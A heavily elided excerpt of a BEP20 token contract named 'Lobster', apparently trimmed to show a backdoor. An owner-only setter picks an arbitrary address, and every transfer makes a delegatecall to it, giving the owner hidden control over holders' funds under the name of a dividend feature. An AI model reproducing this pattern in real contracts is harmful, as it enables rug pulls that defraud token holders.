...
contract Lobster is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'Lobster';
  ...
  */
  ...
  function claimDividendLobster(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_Lobster.delegatecall(
  ...
  function SetBonusLobster(address c) public onlyOwner {
    C_Lobster = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendLobster(sender, recipient, amount);   
